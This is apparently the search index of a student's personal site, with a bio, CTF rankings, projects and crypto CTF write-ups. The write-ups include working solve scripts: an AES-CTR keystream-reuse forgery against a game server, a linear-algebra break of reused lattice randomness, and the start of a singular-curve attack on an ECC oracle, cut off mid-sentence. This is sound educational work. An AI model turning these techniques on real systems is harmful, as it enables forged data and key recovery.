{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"spyduck007      TJCSC Officer &amp; High School Student. Exploring Cybersecurity and AI/ML through CTFs, mentorship, and breaking things."},{"location":"#latest-updates","title":"Latest Updates","text":"2026-01-30 Abusing Encrypted Saves Jeanne-d-Hack-CTF-2026crypto 2026-01-23 Reduced Dimension 0xL4ugh-CTF-v5crypto 2026-01-23 Bitcoin 0xL4ugh-CTF-v5crypto"},{"location":"about/","title":"What's up! I'm Ansh (spyduck007)","text":"<p>Hey! I\u2019m Ansh, a high school student at TJ who likes to understand how systems work, and then see how they break, how they can be improved, and how to explain all of that to other people.</p> <p>I\u2019m interested in both cybersecurity and AI/ML, and a lot of my learning happens through building things, breaking them, and iterating until I actually understand what\u2019s going on under the hood.</p>"},{"location":"about/#how-i-got-started","title":"How I got started","text":"<p>My first real technical project was back in freshman year, when I built a secure file transfer tool. At the time, I didn\u2019t know much beyond the basics, but that project taught me how security concepts like encryption, authentication, and threat models apply in practice, not just in theory.</p> <p>That experience hooked me. Since then, I\u2019ve been steadily expanding into different areas of cybersecurity, especially through hands-on work and CTF competitions. I enjoy starting with something small, realizing how many things I don\u2019t know, and slowly filling in those gaps through research, testing, and failure.</p>"},{"location":"about/#cybersecurity-ctfs","title":"Cybersecurity &amp; CTFs","text":"<p>A big part of my growth has come from my involvement with my school\u2019s cybersecurity club:</p> <ul> <li>TJCSC \u2014 TJ\u2019s Cybersecurity Club (CTFtime)</li> </ul> <p>I\u2019m currently an officer in TJCSC, where I:</p> <ul> <li>Compete in CTFs with the team</li> <li>Help organize and run in-house events</li> <li>Mentoring fellow club members cybersecurity topics and core concepts</li> <li>Design challenges and explain solutions in a way that\u2019s approachable</li> </ul> <p>Teaching has been one of the most rewarding parts of this experience. Explaining a concept forces me to understand it more deeply, and I enjoy helping others go from confusion to confidence, especially when they solve something they initially thought was impossible.</p>"},{"location":"about/#interests","title":"Interests","text":"<p>Within cybersecurity, I\u2019m especially drawn to areas where logic, creativity, and persistence intersect:</p> <ul> <li>Cryptography, forensics, networking, and AI/ML vulnerabilities</li> <li>Reverse engineering and binary exploitation (still a work in progress, but I\u2019m committed)</li> <li>Web exploitation and other CTF categories as they come up</li> </ul> <p>Alongside security, I also work on AI/ML projects and tools, often experimenting with models, automation, or ways to augment existing workflows. I like using ML as a practical tool, not just training models, but understanding where they succeed, where they fail, and how they interact with real systems.</p>"},{"location":"about/#what-im-working-on-now","title":"What I\u2019m working on now","text":"<p>Right now, I\u2019m focused on:</p> <ul> <li>Building personal cybersecurity and AI/ML projects that solve problems I actually care about</li> <li>Preparing lectures, workshops, and challenges for TJCSC events</li> <li>Writing clearer documentation and write-ups that reflect my real thought process</li> <li>Actively improving in rev and pwn (they\u2019re still humbling, but that\u2019s part of the fun)</li> <li>Writing and Publishing a research paper on AI/ML algorithms</li> <li>Continuing to participate in more CTF competitions all over the world</li> </ul>"},{"location":"about/#outside-the-code","title":"Outside the code","text":"<p>Beyond the technical side, I care about ethical hacking, responsible disclosure, and using technical skills in ways that genuinely make systems safer. I enjoy collaborating with curious people, mentoring others, and building tools that help someone else learn faster than I did.</p>"},{"location":"ctf-history/","title":"CTF History","text":"<p>Here is a record of my participation and rankings in various CTF competitions.</p> Competition Rank # of Teams PascalCTF 2026 69th 864 ATC Winter Vibes Community CTF 2.0 52nd 483 Jeanne d'Hack CTF 2026 25th 384 VSL CTF 2026 78th 114 0xL4ugh CTF v5 20th 533 UofTCTF 2026 46th 1550 New Year CTF 2026 26th 556 Advent of CTF 2025 78th 2230 TSG CTF 2025 31st 488 0CTF 2025 15th 453 BSides Algiers 2025 7th 333 niteCTF 2025 1st \ud83d\udc51 1299 NexHunt CTF 2025 28th 588 BackdoorCTF 2025 47th 602 VuwCTF 2025 5th 119 Null CTF 2025 18th 611 Haix-la-Chapelle 2025 1st \ud83d\udc51 131 LakeCTF Quals 2025 51st 498 PatriotCTF 2025 54th 1343 GlacierCTF 2025 37th 503 AmateursCTF 2025 3rd 849 BuckeyeCTF 2025 3rd 715 V1t CTF 2025 40th 1237 DEADFACE CTF 2025 69th 787 picoCTF 2025 35th 1817 WinterCTF 2024 1st \ud83d\udc51 75"},{"location":"mentoring/","title":"Mentoring","text":"<p>     I am passionate about sharing my knowledge in cybersecurity. As an officer at my club, I regularly give lectures and create practice CTF challenges to help members improve their skills. Below are some of the presentations I have delivered.   </p> 50+ Students Mentored Including 15-20 one-on-one 9-12 Grade Levels Freshmen to Seniors 150+ Hours Invested 4 hrs/week preparing &amp; teaching 5+ Core Topics Crypto, Forensics, Networking, Linux, Rev Measurable Outcomes Team Growth <p>Several mentees demonstrated exceptional growth and were invited to join our competitive CTF team, contributing to our collective success.</p> CTF Hosting <p>Co-organized two full-scale CTF events, designing over 10 original challenges across Web, Crypto, and Forensics categories to test and teach participants.</p> Reusable Curriculum <p>Developed a library of reusable educational materials, including 3 major presentations and hands-on labs, that continue to serve as core learning resources.</p> Presentations 2026-01-21 Polyglot Files <p>Introductions to polyglot files and file types</p> ForensicsFile Security 2025-10-28 Networking Intro <p>Intro to Wireshark and Networking</p> NetworkingWireshark 2025-10-01 Introduction to Cryptography <p>Basic Introduction to Cryptography and Modular Arithmetic</p> CryptographyMath 2025-04-09 Polyglot Payloads <p>Understanding and creating polyglot payloads for security testing.</p> ForensicsPayloads"},{"location":"projects/","title":"Projects","text":"<p>     Here are some of the technical projects I've worked on, ranging from cybersecurity tools to AI/ML experiments.   </p> Genetic Neural Network Architecture Optimization <p>         Published peer-reviewed research in the National High School Journal of Science (NHSJS). Developed a hybrid evolutionary + Bayesian optimization framework that evolves neural network architectures using genetic algorithms and then fine-tunes them with Bayesian optimization, achieving higher validation accuracy than manual tuning, random search, or standalone BO on MNIST.       </p> Research Machine Learning Neural Architecture Search Secure File Transfer Tool <p>         A Python-based secure file transfer tool using a custom Secure Chunked Transfer (SCA) protocol that encrypts, chunks, shuffles, and verifies files with ChaCha20-Poly1305 and SHA-256 to protect confidentiality and resist traffic analysis during network transmission.       </p> Python Cryptography Networking Adversarial AI Defense <p>         Developed an end-to-end adversarial machine learning pipeline in Python that trains a CNN on MNIST, generates adversarial examples using FGSM and PGD attacks, and implements a statistical anomaly detector to identify and mitigate adversarial inputs, illustrating core concepts in AI security and model robustness.       </p> Machine Learning AI Security Log Analyzer <p>         Created a lightweight Python-based intrusion detection framework that parses Zeek system logs, normalizes events, and applies time-windowed behavioral rules to detect SSH brute force, web scanning, and other malicious activity patterns for offline security analysis.       </p> Python Log Analysis NetFlow Attack Sequencer <p>         Automated a Python-based event correlation engine that ingests NetFlow network flow data to build a temporal-similarity graph and extract sequences of related events, helping reveal potential multi-stage attack chains hidden within large volumes of traffic for more insightful analysis.       </p> Networking Log Analysis Algorithms Understanding the Effectiveness of Deep Learning Models for Vulnerability Detection <p>         Replicated and evaluated a state-of-the-art deep learning vulnerability detection approach by implementing behavior graph extraction and CodeBERT-based embeddings to demonstrate that incorporating inter-function semantic relationships improves recall and overall performance on real C code datasets.       </p> Vulnerability Detection Deep Learning Research"},{"location":"write-ups/","title":"CTF Writeups","text":"All 0xL4ugh-CTF-v5 Advent-of-CTF-2025 Jeanne-d-Hack-CTF-2026 LakeCTF-Quals-2025 crypto web 2026-01-30 Abusing Encrypted Saves Jeanne-d-Hack-CTF-2026crypto 2026-01-23 Reduced Dimension 0xL4ugh-CTF-v5crypto 2026-01-23 Bitcoin 0xL4ugh-CTF-v5crypto 2025-12-01 The Mission Begins Advent-of-CTF-2025crypto 2025-11-28 Ez Part LakeCTF-Quals-2025crypto 2025-11-28 Quantum Vernam LakeCTF-Quals-2025crypto 2025-11-28 Guess Flag LakeCTF-Quals-2025crypto 2025-11-28 Attack of the Clones LakeCTF-Quals-2025crypto 2025-11-28 gamblecore LakeCTF-Quals-2025web 2025-11-28 The Phantom Menace LakeCTF-Quals-2025crypto 2025-11-28 Revenge of the Sith LakeCTF-Quals-2025crypto"},{"location":"write-ups/_template/","title":"Challenge Name","text":"<p>Category: Crypto Flag: <code>flag{example_flag}</code></p>","tags":["Category","CTF-Name"]},{"location":"write-ups/_template/#description","title":"Description","text":"<p>Copy the challenge description here.</p>","tags":["Category","CTF-Name"]},{"location":"write-ups/_template/#initial-analysis","title":"Initial Analysis","text":"<p>Describe your first steps.</p>","tags":["Category","CTF-Name"]},{"location":"write-ups/_template/#solution","title":"Solution","text":"<p>Explain how you solved it. You can use math:</p> \\[ a^2 + b^2 = c^2 \\] <p>And code blocks:</p> <pre><code>def solve():\n    print(\"flag\")\n</code></pre>","tags":["Category","CTF-Name"]},{"location":"write-ups/abusing-encrypted-saves/","title":"Abusing Encrypted Saves","text":"<p>Challenge: Abusing Encrypted Saves Category: Crypto Flag: <code>JDHACK{M45t3r_0f_A3S_ch34t1nG}</code></p>","tags":["crypto","Jeanne-d-Hack-CTF-2026"]},{"location":"write-ups/abusing-encrypted-saves/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We\u2019re given a Python server (<code>server.py</code>) that implements a simple rock\u2013paper\u2013scissors game over TCP. We connect via:</p> <pre><code>nc crypto.jeanne-hack-ctf.org 5000\n</code></pre> <p>The menu looks like this:</p> <pre><code>--- Main Menu ---\n1. Play a game\n2. View statistics\n3. Save progress\n4. Load progress\n5. Show the flag\n6. Exit\n</code></pre> <p>The goal is to \u201cachieve 100 consecutive victories\u201d and then use option 5 to obtain the flag.</p> <p>The server keeps some stats in a dictionary, something like:</p> <pre><code>player_progress = {\n    \"wins\": 0,\n    \"losses\": 0,\n    \"draws\": 0,\n    \"total_games\": 0,\n    \"winrate\": 0.0,\n}\n</code></pre> <p>The interesting part (for a crypto challenge) is the way the game saves and loads your progress. It uses the <code>cryptography</code> library with AES in CTR mode:</p> <pre><code>from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n\nkey = os.urandom(16)\nnonce = os.urandom(16)\nself.cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))\n</code></pre> <p>This <code>cipher</code> object is created once per connection and reused for all saves/loads.</p> <p>When you save your progress (option 3), the server:</p> <ol> <li>Formats the stats as zero-padded strings and serializes them to JSON.</li> <li>Prints the JSON in plaintext.</li> <li>Encrypts that same JSON with AES-CTR.</li> <li>Prints the base64-encoded ciphertext.</li> </ol> <p>Roughly:</p> <pre><code>formatted_save = dict(\n    (k, f\"{v:03}\") for k, v in player_progress.items()\n)\nsave = json.dumps(formatted_save)\n\nclient_socket.send(f\"\\nYour actual stats: {save}\\n\".encode())\n\nencryptor = self.cipher.encryptor()\nsecure_save = base64.b64encode(\n    encryptor.update(save.encode()) + encryptor.finalize()\n)\nclient_socket.send(f\"Your save : {secure_save.decode()}\\n\".encode())\n</code></pre> <p>To load progress (option 4), it asks for a base64 string, decodes it, and decrypts with:</p> <pre><code>decryptor = self.cipher.decryptor()\nsave = json.loads(\n    decryptor.update(decoded_save) + decryptor.finalize()\n)\nplayer_progress[\"total_games\"] = int(save.get(\"total_games\"))\nplayer_progress[\"winrate\"]     = float(save.get(\"winrate\"))\n# etc...\n</code></pre> <p>Finally, the flag check in <code>show_flag</code> is:</p> <pre><code>if player_progress[\"total_games\"] &gt;= 100 and player_progress[\"winrate\"] == 100.0:\n    # print flag\n</code></pre> <p>So the crypto question is: can we trick the server into loading a forged save with <code>total_games &gt;= 100</code> and <code>winrate == 100.0</code> without actually winning 100 times?</p> <p>Spoiler: yes. And we never play a single round.</p>","tags":["crypto","Jeanne-d-Hack-CTF-2026"]},{"location":"write-ups/abusing-encrypted-saves/#the-vulnerability","title":"The Vulnerability","text":"<p>There are two key design flaws:</p> <ol> <li>AES-CTR with a fixed key &amp; nonce per connection    The server initializes:</li> </ol> <pre><code>key = os.urandom(16)\nnonce = os.urandom(16)\nself.cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))\n</code></pre> <p>and then repeatedly calls <code>self.cipher.encryptor()</code> and <code>self.cipher.decryptor()</code> for every save/load. Each call starts CTR from the same initial counter value. That means every encryption begins with the same keystream.</p> <ol> <li> <p>Leaking plaintext and ciphertext of the same message    For a save, the server prints both:</p> </li> <li> <p><code>Your actual stats: &lt;JSON&gt;</code>  (plaintext)</p> </li> <li><code>Your save : &lt;base64&gt;</code>       (ciphertext)</li> </ol> <p>Both correspond to the same underlying bytes.</p> <p>AES-CTR works like this:</p> <p><code>ciphertext = plaintext XOR keystream</code></p> <p>The keystream is determined solely by <code>(key, nonce, counter)</code>. If you reuse key+nonce and reset the counter, you reuse the same keystream.</p> <p>If you know a plaintext\u2013ciphertext pair <code>(P, C)</code> under AES-CTR with a fixed <code>(key, nonce)</code> then you can compute the keystream:</p> <p><code>keystream = P XOR C</code></p> <p>Once you know the keystream, you can encrypt any other chosen plaintext <code>P'</code> of the same length:</p> <p><code>C' = P' XOR keystream</code></p> <p>When the server decrypts <code>C'</code> with the same <code>(key, nonce)</code>, it will recover exactly <code>P'</code>.</p> <p>So this challenge degenerates into: \u201cUse the known-plaintext save to recover the keystream, then forge a save that encodes 100 wins and 100% winrate.\u201d</p>","tags":["crypto","Jeanne-d-Hack-CTF-2026"]},{"location":"write-ups/abusing-encrypted-saves/#the-logic","title":"The Logic","text":"<p>Let\u2019s look at the exact JSON used in a fresh connection.</p> <p>When we connect for the first time and immediately save (without playing), the stats dictionary is all zeros. The server formats each value with <code>\"{:03}\"</code> and then JSON-encodes the dict. So we get something like:</p> <pre><code>{\"wins\": \"000\", \"losses\": \"000\", \"draws\": \"000\", \"total_games\": \"000\", \"winrate\": \"0.0\"}\n</code></pre> <p>Call this byte string <code>P</code> (plaintext).</p> <p>The server encrypts it using AES-CTR with the fixed cipher and gives us <code>C</code> (after base64 decoding). As noted:</p> <ul> <li><code>C = P XOR K</code></li> <li>So <code>K = P XOR C</code></li> </ul> <p>Now we want to craft a fake JSON <code>P'</code> that will be accepted by <code>load_progress</code> as:</p> <pre><code>wins        = 100\nlosses      = 0\ndraws       = 0\ntotal_games = 100\nwinrate     = 100.0\n</code></pre> <p>Remember the loading code:</p> <pre><code>player_progress[\"wins\"]        = int(save.get(\"wins\"))\nplayer_progress[\"losses\"]      = int(save.get(\"losses\"))\nplayer_progress[\"draws\"]       = int(save.get(\"draws\"))\nplayer_progress[\"total_games\"] = int(save.get(\"total_games\"))\nplayer_progress[\"winrate\"]     = float(save.get(\"winrate\"))\n</code></pre> <p>So if we send:</p> <pre><code>{\"wins\": \"100\", \"losses\": \"000\", \"draws\": \"000\", \"total_games\": \"100\", \"winrate\": \"100\"}\n</code></pre> <p>we get:</p> <ul> <li><code>int(\"100\")   -&gt; 100</code></li> <li><code>int(\"000\")   -&gt; 0</code></li> <li><code>float(\"100\") -&gt; 100.0</code></li> </ul> <p>This satisfies the flag condition! The only subtle requirement is:</p> <p><code>P'</code> must be the same length as <code>P</code>.</p> <p>In our case:</p> <ul> <li><code>\"0.0\"</code> and <code>\"100\"</code> both have length 3, so the JSON strings with all zeros vs all hundreds end up having the same number of characters.</li> <li>The exploit script checks this with an assert, but in practice they match nicely.</li> </ul> <p>Once we have <code>P'</code> of the same length as <code>P</code>, we can create a forged ciphertext:</p> <p><code>C' = P' XOR K = P' XOR (P XOR C)</code></p> <p>and send base64(<code>C'</code>) to the server as a \u201csave file\u201d in option 4. The server will decrypt <code>C'</code> with the same AES-CTR keystream and directly recover <code>P'</code>, updating the stats to 100 wins / 100 games / 100% winrate.</p> <p>Then option 5 prints the flag.</p>","tags":["crypto","Jeanne-d-Hack-CTF-2026"]},{"location":"write-ups/abusing-encrypted-saves/#constructing-the-exploit","title":"Constructing the Exploit","text":"<p>The network protocol is very simple:</p> <ol> <li>Server sends a banner and the main menu.</li> <li>You send a number (1\u20136) followed by a newline.</li> <li>Depending on your choice, it prints some text and possibly asks for input again.</li> </ol> <p>We want to:</p> <ol> <li>Save once to obtain a known plaintext\u2013ciphertext pair.</li> <li>Use that to compute the keystream locally.</li> <li>Load a forged ciphertext that decrypts to our desired JSON.</li> <li>Use Show the flag.</li> </ol> <p>I used <code>pwntools</code> to keep the interaction convenient.</p> <p>High-level steps:</p> <ol> <li> <p>Connect and synchronize to the first prompt (<code>\"&gt; \"</code>).</p> </li> <li> <p>Send <code>\"3\"</code> to trigger a save.</p> </li> <li> <p>Use <code>recvuntil(\"Your actual stats: \")</code> to skip the menu and read the plaintext JSON line.</p> </li> <li> <p>Use <code>recvuntil(\"Your save : \")</code> and then read the base64 ciphertext line.</p> </li> <li> <p>Decode both; compute <code>keystream = plaintext XOR ciphertext</code>.</p> </li> <li> <p>Build <code>P'</code>:</p> </li> </ol> <pre><code>desired_save = {\n    \"wins\": \"100\",\n    \"losses\": \"000\",\n    \"draws\": \"000\",\n    \"total_games\": \"100\",\n    \"winrate\": \"100\",\n}\nforged_plain = json.dumps(desired_save).encode()\n</code></pre> <ol> <li> <p>Assert <code>len(forged_plain) == len(plain_json)</code> (safety check).</p> </li> <li> <p>Compute <code>forged_ct = forged_plain XOR keystream</code> and base64-encode it.</p> </li> <li> <p>Synchronize with the menu again, send <code>\"4\"</code>, and when asked for the encrypted save, send our forged base64.</p> </li> <li> <p>Finally send <code>\"5\"</code> and read the flag.</p> </li> </ol>","tags":["crypto","Jeanne-d-Hack-CTF-2026"]},{"location":"write-ups/abusing-encrypted-saves/#solution-script","title":"Solution Script","text":"<p>Here is the final exploit script I used:</p> <pre><code>from pwn import *\nimport base64\nimport json\n\nHOST = \"crypto.jeanne-hack-ctf.org\"\nPORT = 5000\n\ndef main():\n    r = remote(HOST, PORT)\n\n    r.recvuntil(b\"Choose your option:\")\n    r.recvuntil(b\"&gt; \")\n\n    r.sendline(b\"3\")\n\n    r.recvuntil(b\"Your actual stats: \")\n    plain_json = r.recvline().strip()\n\n    r.recvuntil(b\"Your save : \")\n    b64_ct = r.recvline().strip()\n    ct = base64.b64decode(b64_ct)\n\n    # Sanity check\n    assert len(plain_json) == len(ct), f\"len mismatch: {len(plain_json)} vs {len(ct)}\"\n\n    keystream = bytes(p ^ c for p, c in zip(plain_json, ct))\n\n    desired_save = {\n        \"wins\": \"100\",\n        \"losses\": \"000\",\n        \"draws\": \"000\",\n        \"total_games\": \"100\",\n        \"winrate\": \"100\",\n    }\n    forged_plain = json.dumps(desired_save).encode()\n\n    assert len(forged_plain) == len(plain_json), \"Forged JSON length mismatch!\"\n\n    forged_ct = bytes(p ^ k for p, k in zip(forged_plain, keystream))\n    forged_b64 = base64.b64encode(forged_ct)\n\n    r.recvuntil(b\"Choose your option:\")\n    r.recvuntil(b\"&gt; \")\n\n    r.sendline(b\"4\")\n    r.recvuntil(b\"encrypted save:\")\n    r.recvuntil(b\"&gt; \")\n    r.sendline(forged_b64)\n\n    r.recvuntil(b\"Your stats have been upgraded!\")\n    r.recvuntil(b\"Choose your option:\")\n    r.recvuntil(b\"&gt; \")\n\n    r.sendline(b\"5\")\n    print(r.recvall(timeout=3).decode())\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>Running this script connects to the server, grabs the original save, recovers the AES-CTR keystream, forges a \u201cperfect\u201d save with 100 wins and 100% winrate, loads it, and finally prints the flag.</p>","tags":["crypto","Jeanne-d-Hack-CTF-2026"]},{"location":"write-ups/attack-of-the-clones/","title":"Attack of the Clones","text":"<p>Challenge: Attack of the Clones Category: Crypto Flag: <code>EPFL{2oo000_un1t5_r34dy_w1th_4_m1ll10n_m0r3_w3ll_0n_th3_w4y_i6o}</code></p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/attack-of-the-clones/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We are given a Python script <code>chall.py</code> and a data file <code>keys.json</code>. The challenge implements a specific type of cryptography based on lattices. If you are familiar with Ring-LWE (Learning With Errors) or the Kyber algorithm used in post-quantum cryptography, this structure looks very familiar.</p> <p>The script defines a few specific parameters:</p> <ul> <li>Modulus (q): 3329 (all numbers are kept within this range).</li> <li>Dimension (n): 512 (we are working with polynomials that have 512 coefficients).</li> <li>k: 4 (the matrices are 4x4 grids of these polynomials).</li> </ul> <p>The math operates in a \"Polynomial Ring\". In simple terms, this means we add and multiply polynomials. If the coefficients get too big, we take the remainder modulo 3329. If the polynomial gets too long (degree 512 or higher), we wrap it around using a rule where <code>x^512</code> becomes <code>-1</code>.</p> <p>The encryption function looks standard for this type of cryptography. It takes a public matrix <code>A</code>, a public vector <code>t</code>, and a message. It generates a secret vector <code>r</code> and two error vectors, <code>e1</code> and <code>e2</code>.</p> <p>The equations for the ciphertext parts <code>u</code> and <code>v</code> are essentially:</p> <ol> <li><code>u = A * r + e1</code></li> <li><code>v = t * r + e2 + message</code></li> </ol> <p>The security of this system relies entirely on <code>e1</code> and <code>e2</code>. These are random \"noise\" that make it mathematically impossible to figure out <code>r</code> or the <code>message</code> just by looking at the public keys and ciphertexts.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/attack-of-the-clones/#the-vulnerability","title":"The Vulnerability","text":"<p>I looked at the specific section of the code that runs the encryption:</p> <pre><code>r = [_small_noise(n) for _ in range(k)]\ne_1 = [_small_noise(n) for _ in range(k)]\ne_2 = _small_noise(n)\n\nu_1, v_1 = encrypt(A_1, t_1, m_b, r, e_1, e_2)\nu_2, v_2 = encrypt(A_2, t_2, m_b, r, e_1, e_2)\n</code></pre> <p>This is where the \"Attack of the Clones\" happens. The challenger generates the randomness once. Specifically, the secret vector <code>r</code> and the error vector <code>e1</code> are generated a single time.</p> <p>Then, the script encrypts the same message twice.</p> <ol> <li>First, using Public Key 1 (<code>A1</code>, <code>t1</code>).</li> <li>Second, using Public Key 2 (<code>A2</code>, <code>t2</code>).</li> </ol> <p>Because the randomness was reused, we can break the encryption. The vulnerability lies in the fact that the error term <code>e1</code> is identical in both encrypted outputs.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/attack-of-the-clones/#the-logic","title":"The Logic","text":"<p>Let's look at the equations for the first part of the ciphertext (<code>u</code>) for both encryptions:</p> <ol> <li><code>u1 = A1 * r + e1</code></li> <li><code>u2 = A2 * r + e1</code></li> </ol> <p>In algebra, if you have two equations with the same unknown value added to them, you can subtract the equations to get rid of that value. Here, we can subtract the second equation from the first to completely eliminate the error <code>e1</code>.</p> <p><code>u1 - u2 = (A1 * r + e1) - (A2 * r + e1)</code></p> <p>The <code>e1</code> cancels out, leaving us with:</p> <p><code>u1 - u2 = (A1 - A2) * r</code></p> <p>We know <code>u1</code> and <code>u2</code> from the file provided. We also know the public keys <code>A1</code> and <code>A2</code>. We can calculate the difference between the ciphertexts (let's call it <code>diff_u</code>) and the difference between the keys (let's call it <code>diff_A</code>).</p> <p>We are left with a clean linear equation with no noise: <code>diff_u = diff_A * r</code></p> <p>This is just a system of linear equations. We can solve this to find <code>r</code> directly.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/attack-of-the-clones/#constructing-the-solver","title":"Constructing the Solver","text":"<p>To solve this using a computer, we need to translate the \"polynomial multiplication\" used in the encryption into standard linear algebra (matrices and vectors of numbers).</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/attack-of-the-clones/#from-polynomials-to-matrices","title":"From Polynomials to Matrices","text":"<p>When you multiply two polynomials in this specific ring, it is equivalent to multiplying a vector by a special kind of matrix called a \"negacyclic matrix\".</p> <p>If we treat our unknown <code>r</code> as a long list of numbers, multiplying it by a polynomial coefficient involves shifting the list.</p> <ul> <li>Multiplying by a constant is just standard multiplication.</li> <li>Multiplying by <code>x</code> shifts every number to the right by one spot.</li> <li>The number that falls off the end wraps around to the front, but its sign is flipped (multiplied by -1).</li> </ul>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/attack-of-the-clones/#building-the-system","title":"Building the System","text":"<p>We have <code>k=4</code> polynomials, each with <code>n=512</code> coefficients.</p> <ul> <li>The vector <code>r</code> contains 4 polynomials, so it has <code>4 * 512 = 2048</code> total variables.</li> <li>The matrix we built (<code>diff_A</code>) is a 4x4 grid of polynomials.</li> </ul> <p>When we convert this to a standard system of numbers, we get a massive grid of size 2048x2048. I used SageMath to build this matrix because it has excellent built-in tools for handling sparse matrices (matrices mostly filled with zeros) and doing math with a modulus.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/attack-of-the-clones/#decryption","title":"Decryption","text":"<p>Once we solve the system, we have the secret vector <code>r</code>. Now we can look at the second part of the ciphertext to get the flag.</p> <p>The equation for the second part is: <code>v1 = t1 * r + e2 + message</code></p> <p>Since we know the public key <code>t1</code> and we just recovered <code>r</code>, we can calculate the \"shared secret\" part ourselves: <code>shared_secret = t1 * r</code></p> <p>Now we subtract that from the ciphertext: <code>remainder = v1 - shared_secret</code></p> <p>Mathematically, <code>remainder</code> is equal to <code>e2 + message</code>.</p> <ul> <li><code>e2</code> is very small \"noise\".</li> <li>The <code>message</code> is encoded bits. A binary <code>0</code> is encoded as the number 0. A binary <code>1</code> is encoded as a number roughly half the size of the modulus (approx. 1664).</li> </ul> <p>So, to decrypt, we just look at each number in the remainder:</p> <ul> <li>If the number is close to 0 (or close to 3329), the bit is 0.</li> <li>If the number is close to 1664, the bit is 1.</li> </ul>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/attack-of-the-clones/#solution-script","title":"Solution Script","text":"<p>Here is the final SageMath script. It loads the keys, constructs the large linear system by computing the difference between the two instances, solves for the reused randomness <code>r</code>, and decrypts the flag.</p> <pre><code>import json\nfrom sage.all import GF, vector, matrix, PolynomialRing\n\nwith open(\"keys.json\", \"r\") as f:\n    data = json.load(f)\n\nq, n, k = 3329, 512, 4\n\nA1 = data[\"A_1\"]\nA2 = data[\"A_2\"]\nu1 = data[\"u_1\"]\nu2 = data[\"u_2\"]\nt1 = data[\"t_1\"]\nv1 = data[\"v_1\"]\n\nD = [[[ (A1[l][j][i] - A2[l][j][i]) % q for i in range(n)] for j in range(k)] for l in range(k)]\nu_diff = [[(u1[i][x] - u2[i][x]) % q for x in range(n)] for i in range(k)]\n\ny_list = []\nfor row in u_diff:\n    y_list.extend(row)\ny = vector(GF(q), y_list)\n\nM = matrix(GF(q), k*n, k*n, sparse=True)\nfor i in range(k):\n    for j in range(k):\n        coeffs = [D[l][j][i] for l in range(k)]\n        row_offset, col_offset = i * n, j * n\n        for l, c in enumerate(coeffs):\n            if c == 0: continue\n            for idx in range(n - l):\n                M[row_offset + idx + l, col_offset + idx] += c\n            for idx in range(n - l, n):\n                target_row = idx + l - n\n                M[row_offset + target_row, col_offset + idx] -= c\n\nr_vec = M.solve_right(y)\n\nr = [list(r_vec[j*n : (j+1)*n]) for j in range(k)]\n\nR = PolynomialRing(GF(q), 'x')\nx = R.gen()\nmodulus = x^n + 1\n\ndef poly_mul_mod(p1_list, p2_list):\n    return (R(p1_list) * R(p2_list) % modulus).list()\n\nv_calc = [0] * n\nfor idx in range(k):\n    prod_ints = [int(x) for x in poly_mul_mod(t1[idx], r[idx])]\n    for i in range(n):\n        if i &lt; len(prod_ints):\n            v_calc[i] = (v_calc[i] + prod_ints[i]) % q\n\ndiff = [(v1[i] - v_calc[i]) % q for i in range(n)]\n\nbits = []\ncenter = q // 2\nfor val in diff:\n    val = int(val)\n    dist_to_center = abs(val - center)\n    dist_to_zero = min(val, q - val)\n    bits.append(1 if dist_to_center &lt; dist_to_zero else 0)\n\nflag_chars = [chr(int(\"\".join(str(b) for b in bits[i:i+8]), 2)) for i in range(0, len(bits), 8) if len(bits[i:i+8]) == 8]\nflag = \"\".join(flag_chars)\n\nprint(flag)\n</code></pre> <p>Running the script recovers the flag successfully.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/bitcoin/","title":"Bitcoin","text":"<p>Challenge: Bitcoin Category: Crypto Flag: <code>0xL4ugh{B1tc0in_Squiggl3_d3m0_By_Zwique_1af5f2582942ff7d}</code></p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/bitcoin/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We are provided with a <code>netcat</code> connection to a service titled \"Curve Oracle Service v2.0\". The challenge name \"Bitcoin\" strongly implies the use of the secp256k1 elliptic curve, which has the equation <code>y^2 = x^3 + 7</code>.</p> <p>Upon connecting, the service describes its operation: 1. It holds a secret key <code>d</code>. 2. It asks for two ElGamal components, <code>C1</code> and <code>C2</code>. 3. It returns a value <code>S</code> calculated as <code>S = C2 - (d * C1)</code>.</p> <p>The service runs this query 5 times in \"Phase 1\". If we survive that, there is a \"Phase 2\".</p> <p>My immediate suspicion was an Invalid Curve Attack. In ECC implementation, the point addition formulas often do not use the <code>b</code> parameter of the curve equation (<code>y^2 = x^3 + ax + b</code>). If the server does not validate that the points we send actually lie on the curve <code>y^2 = x^3 + 7</code>, we can force it to perform calculations on a weaker curve of our choice.</p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/bitcoin/#the-vulnerability","title":"The Vulnerability","text":"<p>The vulnerability is a specific type of Invalid Curve Attack known as a Singular Curve Attack (or Cusp Attack).</p> <p>For secp256k1, the parameter <code>a = 0</code>. If we provide a point that satisfies <code>y^2 = x^3</code> (effectively setting <code>b = 0</code>), the server will perform calculations on this singular curve.</p> <p>The curve <code>y^2 = x^3 mod p</code> is not secure. It is isomorphic to the Additive Group modulo p. This means the complex Elliptic Curve Discrete Logarithm Problem (ECDLP) collapses into a simple modular arithmetic equation.</p> <p>The mapping from a point <code>P(x, y)</code> on the singular curve to the integer group is simply: <code>map(P) = x / y mod p</code></p> <p>Therefore, the scalar multiplication <code>Q = d * P</code> becomes: <code>map(Q) = d * map(P) mod 